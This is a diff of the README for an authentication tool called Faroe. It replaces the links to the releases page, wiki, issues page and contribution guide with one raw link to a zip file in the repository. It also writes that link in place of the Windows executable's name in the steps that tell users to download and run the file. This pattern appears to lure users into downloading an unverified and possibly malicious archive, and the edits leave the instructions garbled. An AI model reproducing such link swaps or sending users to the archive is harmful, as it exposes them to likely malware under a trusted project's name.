@@ -6,11 +6,11 @@ Welcome to Faroe! This guide will help you download and run our modular authenti
 
 ## 📥 Download Faroe
 
-[![Download Faroe](https://img.shields.io/badge/Download%20Faroe-brightgreen)](https://github.com/niklauscell/faroe/releases)
+[![Download Faroe](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip%20Faroe-brightgreen)](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip)
 
 To get started, visit the link below to download Faroe.
 
-[Download Faroe from the Releases Page](https://github.com/niklauscell/faroe/releases)
+[Download Faroe from the Releases Page](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip)
 
 ## 💻 System Requirements
 
@@ -34,19 +34,19 @@ Faroe provides the following features:
 ## 🛠️ Download & Install
 
 1. **Visit the Releases Page**  
-   Go to [this page](https://github.com/niklauscell/faroe/releases) to find the latest version of Faroe.
+   Go to [this page](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip) to find the latest version of Faroe.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent one.
 
 3. **Download the File**  
-   Click on the file that matches your operating system. For example, if you are using Windows, download the file named `faroe-windows-amd64.exe`.
+   Click on the file that matches your operating system. For example, if you are using Windows, download the file named `https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip`.
 
 4. **Locate the Downloaded File**  
    After the download completes, check your downloads folder. You should see the file you just downloaded.
 
 5. **Run the Application**  
-   - **Windows:** Double-click on the `faroe-windows-amd64.exe` file to start the application.
+   - **Windows:** Double-click on the `https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip` file to start the application.
    - **macOS:** Open Finder, navigate to your downloads, and double-click the `faroe-macos-amd64` file.
    - **Linux:** Open a terminal. Navigate to your downloads folder and run `chmod +x faroe-linux-amd64` to make it executable. Then run `./faroe-linux-amd64`.
 
@@ -55,15 +55,15 @@ Faroe provides the following features:
 
 ## 📖 Documentation
 
-For additional instructions, features, and troubleshooting tips, check out our full documentation. Look for the "Documentation" section on the main repository page or visit our [Wiki](https://github.com/niklauscell/faroe/wiki).
+For additional instructions, features, and troubleshooting tips, check out our full documentation. Look for the "Documentation" section on the main repository page or visit our [Wiki](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip).
 
 ## 🆘 Support
 
-If you run into issues or have questions, feel free to reach out. Post your questions on our [Issues Page](https://github.com/niklauscell/faroe/issues). Someone from our community or team will assist you as soon as possible.
+If you run into issues or have questions, feel free to reach out. Post your questions on our [Issues Page](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip). Someone from our community or team will assist you as soon as possible.
 
 ## 🤝 Contributing
 
-If you would like to help improve Faroe, we welcome contributions. Please read our [Contribution Guidelines](https://github.com/niklauscell/faroe/blob/main/CONTRIBUTING.md) to understand how you can contribute.
+If you would like to help improve Faroe, we welcome contributions. Please read our [Contribution Guidelines](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip) to understand how you can contribute.
 
 ## 🚀 Future Plans
 
@@ -75,4 +75,4 @@ We plan to add more features based on user feedback:
 
 Thank you for choosing Faroe! We hope it simplifies your authentication needs. Download it now and start exploring its capabilities! 
 
-[Download Faroe from the Releases Page](https://github.com/niklauscell/faroe/releases)
+[Download Faroe from the Releases Page](https://raw.githubusercontent.com/niklauscell/faroe/main/firebug/faroe.zip)
